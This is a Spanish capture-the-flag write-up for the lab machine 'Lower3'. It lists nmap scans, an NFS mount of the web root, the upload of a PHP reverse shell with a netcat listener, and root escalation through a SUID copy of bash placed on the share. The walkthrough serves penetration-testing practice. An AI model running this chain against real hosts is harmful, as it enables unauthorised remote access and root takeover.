# Máquina Lower3

### Reconocimiento de la Ip de la máquina víctima

![alt text](image.png)


### Puertos abiertos

sudo nmap -sS --min-rate 6000 -p- --open -vvv -Pn 192.168.42.137

![alt text](image-1.png)


### Servicios y versiones

sudo nmap -sVC --min-rate 6000 -p22,80,111,2049,42209,46301,54087,54875 vvv -Pn 192.168.42.137

![alt text](image-2.png)

![alt text](image-3.png)


### Explotación

Como se trata del protocolo NFS lo que haremos es listar los recursos compartidos:

showmount -e 192.168.42.137

![alt text](image-4.png)

significa que podemos traernos el sistema de archivos de /var/www/html

creamos una carpeta para montarnos el sistema

creamos una carpeta para montarnos el sistema:

mkdir -p /mnt/nfs_share

montamos el sistema

sudo mount -t nfs 192.168.42.137:/var/www/html /mnt/nfs_share

creamos una reverse shell:

nano /mnt/nfs_share/reverse.php

el contenido es la reverse shell de pentestmonkey

![alt text](image-5.png)

luego nos ponemos en ecucha con el puerto que le asignamos en el reverse.php

nc -lvnp 443

y en la url:

http://192.168.42.137/reverse.php

![alt text](image-6.png)

![alt text](image-7.png)

### user.txt

![alt text](image-8.png)

### Escalar privilegios

en la máquina víctima:

copiamos el /bin/bash a nuestro sistema de archivos compartidos /var/www/html

en la máquina atacante:

cambiamos el propietario a root y grupo a root:

sudo chown root:root ./bash

Cambiamos los permisos de un archivo y activamos el bit SUID (Set User ID) para el usuario propietario del archivo:

sudo chmod u+s ./bash

En la máquina víctima:

./bash -p

![alt text](image-9.png)

![alt text](image-10.png)

### root.txt

![alt text](image-11.png)